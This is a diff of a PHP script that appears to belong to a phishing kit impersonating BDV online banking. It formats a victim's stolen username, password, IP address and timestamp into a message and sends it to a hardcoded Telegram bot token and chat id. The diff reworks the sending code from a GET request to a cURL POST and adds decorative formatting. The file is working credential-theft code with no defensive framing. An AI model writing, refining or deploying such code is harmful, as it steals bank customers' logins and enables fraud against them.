@@ -11,16 +11,26 @@ $fecha = date('Y-m-d H:i:s');
 $token = "8080814760:AAFEZS3tJZHNg6zNbPh2JNFSLXNccRSElYQ";
 $chat_id = "6912929677";
 
-$mensaje = "🏦 BDV\n";
+$mensaje = "🏦 ═══ BDV EN LÍNEA ═══ 🏦\n\n";
 $mensaje .= "👤 Usuario: $usuario\n";
 $mensaje .= "🔑 Clave: $password\n";
 $mensaje .= "🌐 IP: $ip\n";
 $mensaje .= "📅 Fecha: $fecha\n";
+$mensaje .= "\n═══════════════════\n";
 
+// Método alternativo para enviar a Telegram
 $url = "https://api.telegram.org/bot$token/sendMessage";
-$data = array('chat_id' => $chat_id, 'text' => $mensaje);
-
-file_get_contents($url . "?" . http_build_query($data));
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
+    'chat_id' => $chat_id,
+    'text' => $mensaje,
+    'parse_mode' => 'HTML'
+]));
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+$response = curl_exec($ch);
+curl_close($ch);
 
 echo json_encode(["success" => true]);
 ?> 
